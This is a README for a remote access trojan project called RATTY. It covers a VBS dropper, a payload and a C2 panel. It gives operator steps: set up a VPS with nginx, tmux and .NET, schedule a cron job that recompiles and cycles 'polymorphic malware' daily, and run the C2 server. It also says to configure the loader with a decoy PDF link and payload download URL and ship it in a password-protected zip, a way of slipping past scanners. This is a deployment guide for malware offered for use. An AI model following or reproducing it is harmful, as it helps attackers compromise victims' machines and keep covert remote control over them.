# RAT

Dropper --> Payload --> <- C2

------------------------------------------------------------------------------------

## Setup
1. Cone Repo onto Server
    -     git clone https://github.com/that-dog-eater/RATTY
2. remove loader.vbs from server
    -     rm loader.vbs
4. Run dotnet_instller.sh 
5. Install Requirments
	-     sudo apt update && sudo apt install tmux -y
	-     sudo apt update && sudo apt install git -y
    -     sudo apt update && sudo apt install nginx -y
    -     sudo apt update && sudo apt install python3 -y
6. Complete files:
	- C2-4.py
	- malware/cycler.sh
	- malware/bin/shell.cs
7. Add cron jobs
   	1.     export VISUAL=nano; crontab -e
   	2.     0 8 * * * /bin/bash /root/malware/cycler.sh >> /root/malware/logs/cron.log 2>&1
	3.     crontab -l (to verify)

 ## Activate C2 Panel
setup the script to run in the background with tmux
  
  1.     tmux new -s C2test
  2.     python3 C2.py
- Detach from session:
1.     Ctrl + B, then D
- Attach to session:

2.     tmux attach -t C2test
  Usefull tmux commands
  
  1.     tmux kill-session -t C2test
       - Kills tmux sessions
  2.     tmux ls
       - Shows tmux session open
    
## Loader
1. Open in IDE and Complete
   - Add pdfUrl
   - Add DownloadUrl
   - Add File_name
  
2.  Zip Dropper + Password Protected
  - Ctrl + shift + rigth click -> 7zip hover -> add to archive -> create password = zip with password

## Overview
- Loader.vbs zipped + passwored protected
- polymorphic malware compiled and cycled on server daily
- C2 live 

### Requirments
- .NET 9.0 installed on Server
- VPS server
- Drive link for PDF
- Git on server
- tmux on server
- nginx on server
